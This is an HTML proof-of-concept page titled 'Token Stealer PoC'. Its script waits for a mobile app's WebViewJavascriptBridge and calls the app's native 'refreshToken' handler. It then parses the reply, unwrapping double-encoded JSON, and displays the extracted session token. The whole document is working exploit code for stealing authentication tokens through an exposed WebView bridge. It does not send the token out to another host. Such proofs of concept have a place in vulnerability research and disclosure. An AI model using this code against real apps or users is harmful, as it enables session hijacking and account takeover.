<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8" />
    <title>Token Stealer PoC</title>
  </head>
  <body style="background:#111; color:#0f0; font-family:monospace;">
    <h1>Waiting for WebViewJavascriptBridge...</h1>
    <pre id="result">Loading...</pre>

    <script>
      function extractToken(data) {
        try {
          const json = JSON.parse(data);
          if (json.token) return json.token;
          const inner = JSON.parse(json); // in case token is double-wrapped
          return inner.token || null;
        } catch (e) {
          return null;
        }
      }

      function tryGetToken() {
        if (!window.WebViewJavascriptBridge) {
          setTimeout(tryGetToken, 500);
          return;
        }

        document.querySelector("h1").textContent = "[*] Bridge Detected!";
        window.WebViewJavascriptBridge.callHandler("refreshToken", null, function (response) {
          const token = extractToken(response);
          document.getElementById("result").textContent =
            token ? "Token:\n" + token : "Failed to extract token.";
        });
      }

      tryGetToken();
    </script>
  </body>
</html>
